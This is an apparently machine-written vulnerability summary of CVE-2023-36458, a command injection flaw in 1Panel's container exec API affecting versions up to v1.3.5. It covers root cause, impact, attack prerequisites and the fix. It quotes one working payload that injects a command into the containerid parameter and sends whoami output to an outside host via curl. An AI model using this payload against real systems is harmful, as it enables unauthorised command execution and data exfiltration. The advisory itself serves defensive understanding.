Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2023-36458:

**Root cause of vulnerability:**
The vulnerability is due to insufficient input sanitization when constructing commands to execute within a container terminal. Specifically, the `containerid` parameter in the API endpoint `/api/v1/containers/exec` is vulnerable to command injection.

**Weaknesses/vulnerabilities present:**
- **Command Injection:** The application directly uses user-supplied input (`containerid` parameter) to construct a command without proper sanitization. This allows an attacker to inject arbitrary commands into the execution context.

**Impact of exploitation:**
- **Arbitrary Command Execution:** An attacker can execute arbitrary system commands on the server hosting the application by crafting a malicious payload in the `containerid` parameter. This can lead to a full compromise of the system, including data breaches, data manipulation, and denial of service.

**Attack vectors:**
- **Network:** The vulnerability can be exploited over the network using a crafted HTTP request to the vulnerable API endpoint.

**Required attacker capabilities/position:**
- **Authentication:** The attacker needs to be authenticated to access the vulnerable API endpoint.
- **Network access:** The attacker needs to have network access to the 1Panel server.
- **Crafted request:** The attacker needs to craft a malicious request including a payload in the `containerid` parameter of the `/api/v1/containers/exec` endpoint.

**Additional details:**
- The vulnerable code is located in `backend\app\api\v1\terminal.go#ContainerWsSsh`.
- The `containerid` parameter, intended to specify the target container, is being directly used in a command, allowing for command injection.
- The provided example demonstrates the vulnerability using `containerid=/bin/bash||curl%20http://192.168.109.1:12345/`whoami`||`. This injects a command to make a curl request with the output of `whoami`.
- The vulnerability is present in versions `<=v1.3.5` of 1Panel.
- It has been fixed in version `v1.3.6`.
- The CVSS v3 base score is 4.3 with a vector of `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L`.
